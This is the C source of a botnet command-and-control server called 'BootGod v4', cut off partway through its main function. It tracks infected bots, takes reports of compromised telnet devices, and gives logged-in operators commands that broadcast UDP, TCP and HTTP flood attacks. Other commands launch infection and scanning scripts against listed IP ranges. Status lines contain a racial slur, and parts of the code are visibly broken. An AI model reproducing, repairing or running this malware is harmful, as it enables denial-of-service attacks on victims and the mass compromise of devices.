/*
Screen Usage: screen ./server [client-port] [threads] [cnc-port]
Skype: Digi-mods
Made Date: 8/21/2016
*/
/*
				*** DO NOT LEAK THIS SHIT ITS PRIVATE AF ***

#________  .__       .__   _____             .___      
#\______ \ |__| ____ |__| /     \   ____   __| _/______
# |    |  \|  |/ ___\|  |/  \ /  \ /  _ \ / __ |/  ___/
# |    `   \  / /_/  >  /    Y    (  <_> ) /_/ |\___ \ 
#/_______  /__\___  /|__\____|__  /\____/\____ /____  >
#        \/  /_____/            \/            \/    \/   
						*** BootGod v4 SERVER.C ***
*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000
//////////////////////////////////
struct login_info {
	char username[20];
	char password[20];
};
static struct login_info accounts[10];
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
struct args {
        int sock;
        struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
//////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */
	hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */
    hints.ai_flags = AI_PASSIVE;     /* All interfaces */
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[32m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL);
                }
                printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[32m> \x1b[0m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
				send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
}}}}}}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0;BOT COUNT: %d| Niggers: %d%c", '\033', BotsConnected(), OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
}}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}
void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
    OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}

        if(send(datafd, "\x1b[30mUsername:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
        if(send(datafd, "\x1b[30mPassword:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto Banner;
        }
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
		char failed_line1[80];

		sprintf(failed_line1, "\x1b[32mWRONG ANSWER BITCH!!\r\n");
		if(send(datafd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
		sleep(5);
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		char ascii_banner_line1 [5000];
		char ascii_banner_line2 [5000];
		char ascii_banner_line3 [5000];
		char ascii_banner_line4 [5000];
		char ascii_banner_line5 [5000];
		char ascii_banner_line6 [5000]; 		
		char ascii_banner_line7 [5000];
		char ascii_banner_line8 [5000];
		char ascii_banner_line9 [5000];
		char ascii_banner_line10 [5000];
		char ascii_banner_line11 [5000];
		char ascii_banner_line12 [5000];
		char ascii_banner_line13 [5000];
		char ascii_banner_line14 [5000];
		char banner_bot_count [2048];
		memset(banner_bot_count, 0, 2048);

		sprintf(ascii_banner_line1,  "\x1b[32m AAAAAAA     NNNNNNN      OOOOOOOOO     NNNNNNN    \r\n");
		sprintf(ascii_banner_line2,  "\x1b[32mAAAAAAAAA   NNNNNNNNN    OOOOOOOOOOO   NNNNNNNNN   \r\n");
		sprintf(ascii_banner_line3,  "\x1b[32mAAA   AAAA  NNN   `NNN  OOOO     OOOO  NNN   `NNN  \r\n");
		sprintf(ascii_banner_line4,  "\x1b[32mAAA    AAA  NNN    NNN  OOO       OOO  NNN    NNN \r\n");
		sprintf(ascii_banner_line5,  "\x1b[32mAAA AAAAAA  NNN    NNN  OOO       OOO  NNN    NNN \r\n");
		sprintf(ascii_banner_line6,  "\x1b[32mAAA  AAAAA  NNN    NNN  OOO       OOO  NNN    NNN  \r\n");
		sprintf(ascii_banner_line7,  "\x1b[32mAAA  AAAAA  NNN    NNN  OOO       OOO  NNN    NNN  \r\n");
		sprintf(ascii_banner_line8,  "\x1b[32mAAA    AAA  NNN    NNN  OOO       OOO  NNN    NNN  \r\n");
		sprintf(ascii_banner_line9,  "\x1b[32mAAA    AAA  NNN    NNN  OOO       OOO  NNN    NNN \r\n");
		sprintf(ascii_banner_line10, "\x1b[32mAAA    AAA  NNN    NNN  OOOO     OOOO  NNN    NNN  \r\n");
		sprintf(ascii_banner_line11, "\x1b[32mAAA    AAA  NNN    NNN   OOOOOOOOOOO   NNN    NNN\r\n");
		sprintf(ascii_banner_line12, "\x1b[32mAAA    AAA  NNN    NNN    OOOOOOOOO    NNN    NNN \r\n"); 
		sprintf(ascii_banner_line13, "\x1b[32m       AA   NN                         NNN       \r\n");   
		sprintf(ascii_banner_line14, "\x1b[32m       A    N                          N         \r\n");        
		sprintf(banner_bot_count, 	"\x1b[32m		~[\x1b[34mBOT COUNT: %d\x1b[32m]~\r\n", BotsConnected(), OperatorsConnected);

		if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line12, strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line14, strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(datafd, banner_bot_count,	strlen(banner_bot_count),	MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, "\x1b[32m> \x1b[37m", 12, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

				while(fdgets(buf, sizeof buf, datafd) > 0)
		{   
	
			if(strstr(buf, "ATTACK")) 
			{
				int choice;
				
				char ATTACK_MENU [2048];
				
				char UDP_ATTACK         [2048];
				char UDP_ATTACK_MESSAGE [2048];
				char UDP_ATTACK_IP [2048];
				char UDP_ATTACK_PORT [2048];
				char UDP_ATTACK_SEC [2048];
				char UDP_ATTACK_SEND_COMMAND [2048];
				
				char TCP_ATTACK         [2048];
				char TCP_ATTACK_MESSAGE [2048];
				char TCP_ATTACK_IP [2048];
				char TCP_ATTACK_PORT [2048];
				char TCP_ATTACK_SEC [2048];
				char TCP_ATTACK_SEND_COMMAND [2048];
				
				char STD_ATTACK         [2048];
				char STD_ATTACK_MESSAGE [2048];
				char STD_ATTACK_IP [2048];
				char STD_ATTACK_PORT [2048];
				char STD_ATTACK_SEC [2048];
				char STD_ATTACK_SEND_COMMAND [2048];
				
					sprintf(ATTACK_MENU, "$ ATTACK Commands $");
					if(send(datafd, ATTACK_MENU, strlen(ATTACK_MENU), MSG_NOSIGNAL) == -1) goto end;
				do
				{
					sprintf(UDP_ATTACK,  "% 1. UDP ATTACK\r\n");
					sprintf(TCP_ATTACK,  "% 2. TCP ATTACK\r\n");
          sprintf(STD_ATTACK,  "% 3. STD ATTACK\r\n");
					
					if(send(datafd, UDP_ATTACK, strlen(UDP_ATTACK), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, TCP_ATTACK, strlen(TCP_ATTACK), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, STD_ATTACK, strlen(STD_ATTACK), MSG_NOSIGNAL) == -1) goto end;
					scanf("%d", &choice);
					
				switch(choice)
				{
					case 1:
					
						sprintf(UDP_ATTACK_IP, "IP: ");
						if(send(datafd, UDP_ATTACK_IP, strlen(UDP_ATTACK_IP), MSG_NOSIGNAL) == -1) goto end;
						scanf("%d", &UDP_ATTACK_IP);
						
						sprintf(UDP_ATTACK_PORT, "Port: ");
						if(send(datafd, UDP_ATTACK_IP, strlen(UDP_ATTACK_IP), MSG_NOSIGNAL) == -1) goto end;
						scanf("%d", &UDP_ATTACK_PORT);
						
						sprintf("Sec: ", &UDP_ATTACK_SEC);
						if(send(datafd, UDP_ATTACK_SEC, strlen(UDP_ATTACK_SEC), MSG_NOSIGNAL) == -1) goto end;
						scanf("%d", &UDP_ATTACK_SEC);
						
						sprintf(UDP_ATTACK_SEND_COMMAND, "!* UDP %d %d %d 32 0 10", UDP_ATTACK_IP, UDP_ATTACK_PORT, UDP_ATTACK_SEC);
						broadcast(UDP_ATTACK_SEND_COMMAND, datafd, "SENT");
						if(send(datafd, UDP_ATTACK_SEND_COMMAND, strlen(UDP_ATTACK_SEND_COMMAND), MSG_NOSIGNAL) == -1) goto end;
						
						sprintf(UDP_ATTACK_MESSAGE, "UDP Attack Sent!");
						if(send(datafd, UDP_ATTACK_MESSAGE, strlen(UDP_ATTACK_MESSAGE), MSG_NOSIGNAL) == -1) goto end;
						
						continue;
					case 2:
					
						sprintf(TCP_ATTACK_IP, "IP: ");
						if(send(datafd, TCP_ATTACK_IP, strlen(TCP_ATTACK_IP), MSG_NOSIGNAL) == -1) goto end;
						scanf("%d", &TCP_ATTACK_IP);
						
						sprintf(TCP_ATTACK_PORT, "Port: ");
						if(send(datafd, TCP_ATTACK_PORT, strlen(TCP_ATTACK_PORT), MSG_NOSIGNAL) == -1) goto end;
						scanf("%d", &TCP_ATTACK_PORT);
						
						sprintf(TCP_ATTACK_SEC, "Sec: ");
						if(send(datafd, TCP_ATTACK_SEC, strlen(TCP_ATTACK_SEC), MSG_NOSIGNAL) == -1) goto end;
						scanf("%d", &TCP_ATTACK_SEC);
						 
						sprintf(TCP_ATTACK_SEND_COMMAND, "!* TCP %d %d %d 32 all 0 10", TCP_ATTACK_IP, TCP_ATTACK_PORT, TCP_ATTACK_SEC);
						broadcast(TCP_ATTACK_SEND_COMMAND, datafd, "SENT");
						if(send(datafd, TCP_ATTACK_SEND_COMMAND, strlen(TCP_ATTACK_SEND_COMMAND), MSG_NOSIGNAL) == -1) goto end;
						
						sprintf(TCP_ATTACK_MESSAGE, "TCP Attack Sent!");
						if(send(datafd, TCP_ATTACK_MESSAGE, strlen(TCP_ATTACK_MESSAGE), MSG_NOSIGNAL) == -1) goto end;
						
						continue;
						
					case 3:
					
						sprintf(STD_ATTACK_IP, "IP: ");
						if(send(datafd, STD_ATTACK_IP, strlen(STD_ATTACK_IP), MSG_NOSIGNAL) == -1) goto end;
						scanf("%d", &STD_ATTACK_IP);
						
						sprintf(STD_ATTACK_PORT, "Port: ");
						if(send(datafd, STD_ATTACK_PORT, strlen(TCP_ATTACK_PORT), MSG_NOSIGNAL) == -1) goto end;
						scanf("%d", &STD_ATTACK_PORT);
						
						sprintf(STD_ATTACK_SEND_COMMAND, "!* STD %d %d %d", STD_ATTACK_IP, STD_ATTACK_PORT, STD_ATTACK_SEC);
						broadcast(STD_ATTACK_SEND_COMMAND, datafd, "SENT");
						if(send(datafd, STD_ATTACK_SEND_COMMAND, strlen(STD_ATTACK_SEND_COMMAND), MSG_NOSIGNAL) == -1) goto end;
						
						sprintf(STD_ATTACK_MESSAGE, "STD Attack Sent!");
						if(send(datafd, STD_ATTACK_MESSAGE, strlen(STD_ATTACK_MESSAGE), MSG_NOSIGNAL) == -1) goto end;
						
						continue;
						
						
				}}
				while(choice !=3);
			}
			if(strstr(buf, "BOTS")) {
				sprintf(botcount, "BOTS: %d | Niggers: %d\r\n", BotsConnected(), OperatorsConnected);
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
				continue;
			}
			if(strstr(buf, "STATUS")){
				sprintf(statuscount, "TELNET DEVICES: %d | TELNET STATUS: %d\r\n", TELFound, scannerreport);
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
				continue;
			}
			if(strstr(buf, "STATS")){
				sprintf(botcount, "BOTS: %d | Niggers: %d\r\n", BotsConnected(), OperatorsConnected);
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
				sprintf(statuscount, "TELNET DEVICES: %d | TELNET STATUS: %d\r\n", TELFound, scannerreport);
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
				continue;
			}
			if(strstr(buf, "INFECT")) {
				system("python telnet.py filtered.txt");
				continue;
			}
			if(strstr(buf, "REINFECT")) {
				system("python w.py DigiBots.txt");
				continue;
			}
			if(strstr(buf, "FILTER")) {
				system("sort telnet.txt | uniq -u>>filtered_telnet.txt;sort infected.txt | uniq -u>>filtered_ssh.txt");
				continue;
			}
			if(strstr(buf, "LOAD")) {
				system("python DIGI.py 500 LOAD 1 1");
				continue;
			}
			if(strstr(buf, "UDP")) {
				system("./udp %d");
				continue;
			}
			if(strstr(buf, "STOP")) {
				system("./stop");
				continue;
			}
			if(strstr(buf, "SCAN3")) {
				system("python DIGI.py 500 B 125.25 3");
				continue;
			}
			if(strstr(buf, "SCAN4")) {
				system("python DIGI.py 500 B 125.26 3");
				continue;
			}
			if(strstr(buf, "SCAN5")) {
				system("python DIGI.py 500 B 125.27	3");
				continue;
			}
			if(strstr(buf, "SCAN6")) {
				system("python DIGI.py 500 B 113.53 3");
				continue;
			}
			if(strstr(buf, "SCAN7")) {
				system("python DIGI.py 500 B 180.180 3");
				continue;
			}
			if(strstr(buf, "SCAN8")) {
				system("python DIGI.py 500 B 185.52 3");
				continue;
			}
			if(strstr(buf, "LUCKY")) {
				system("python DIGI.py 500 XBPT 1 1");
				continue;
			}
			if(strstr(buf, "DIGI")) {
				system("python DIGI.py 500 XBPT2 1 3");
				continue;
			}
			if(strstr(buf, "SCAN_OFF")) {
				system("killall -9 python");
				continue;
			}
			if(strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char helpline1  [80];
				char helpline2  [80];
				char helpline3  [80];
				char helpline4  [80];
				char helpline5  [80];
				char helpline6  [80];
				char helpline7  [80];
				char helpline8  [80];
				char helpline9  [80];
				char helpline10 [80];
				char helpline11 [80];
				char helpline12 [80];
				char helpline13 [80];
				char helpline14 [80];
        
        sprintf(helpline1,  "\x1b[33m __________________________________________\r\n");
				sprintf(helpline2,  "\x1b[33m|\x1b[35m         ~{Name COMMANDS}~\x1b[33m                |\r\n"); 
				sprintf(helpline3,  "\x1b[33m|\x1b[31m ~{!* UDP IP Port Time 32 0 10}~\x1b[33m          |\r\n");
				sprintf(helpline4,  "\x1b[33m|\x1b[32m ~{!* TCP IP Port Time 32 all 0 10}~\x1b[33m      |\r\n");
				sprintf(helpline5,	"\x1b[33m|\x1b[35m ~{!* STD IP Port Time}~\x1b[33m                  |\r\n");
				sprintf(helpline6,  "\x1b[33m|\x1b[31m ~{!* HTTP Url Time}~\x1b[33m                     |\r\n");
				sprintf(helpline7,  "\x1b[33m|\x1b[32m ~{!* KILLATTK | KILL}~\x1b[33m                   |\r\n");
				sprintf(helpline8,	"\x1b[33m|\x1b[35m ~{Perl Scrip Boot | UDP}~\x1b[33m                |\r\n");
				sprintf(helpline9,  "\x1b[33m|\x1b[31m ~{Perl Scrip Stop | STOP}~\x1b[33m               |\r\n");
				sprintf(helpline10,	"\x1b[33m|\x1b[32m ~{!* BOTS | BOTS}~\x1b[33m                       |\r\n");
        sprintf(helpline11,	"\x1b[33m|\x1b[35m ~{ATTACK}~\x1b[33m                               |\r\n");
        sprintf(helpline12,	"\x1b[33m|\x1b[31m ~{CLEAR}~\x1b[33m                                |\r\n");
        sprintf(helpline13,	"\x1b[33m|\x1b[32m ~{LOGOUT}~\x1b[33m                               |\r\n");
        sprintf(helpline14, "\x1b[33m|__________________________________________|\r\n");



				if(send(datafd, helpline1,  strlen(helpline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline2,  strlen(helpline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline3,  strlen(helpline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline4,  strlen(helpline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline5,  strlen(helpline5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline6,  strlen(helpline6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline7,  strlen(helpline7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline8,  strlen(helpline8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline9,  strlen(helpline9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline10, strlen(helpline10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline11, strlen(helpline11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline12, strlen(helpline12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline13, strlen(helpline13), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline14, strlen(helpline14), MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
				continue;
			}
			if(strstr(buf, "KILL")) {
				char killattack [2048];
				memset(killattack, 0, 2048);
				sprintf(killattack, "!* KILLATTK\r\n");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "CLEAR")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line12, strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line14, strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
				if(send(datafd, banner_bot_count,	strlen(banner_bot_count),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, "\x1b[32m> \x1b[37m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "LOGOUT")) {
				char logoutmessage [2048];
				memset(logoutmessage, 0, 2048);
				sprintf(logoutmessage, "Bye, %s", accounts[find_line].username);
				if(send(datafd, logoutmessage, strlen(logoutmessage), MSG_NOSIGNAL) == -1)goto end;
				sleep(5);
				goto end;
			}
                trim(buf);
                if(send(datafd, "\x1b[32m> \x1b[0m", 11, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].username, buf);

				FILE *LogFile;
                LogFile = fopen("server_log.txt", "a");
				time_t now;
				struct tm *gmt;
				char formatted_gmt [50];
				char lcltime[50];
				now = time(NULL);
				gmt = gmtime(&now);
				strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
                fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].username, buf);
                fclose(LogFile);
                broadcast(buf, datafd, accounts[find_line].username);
                memset(buf, 0, 2048);
        }
		end:
			managements[datafd].connected = 0;
			close(datafd);
			OperatorsConnected--;
}
void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1) {
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
}}
int main (int argc, char *argv[], void *sock)//~B1NARY~
{
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
        telFD = fopen("telnet.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
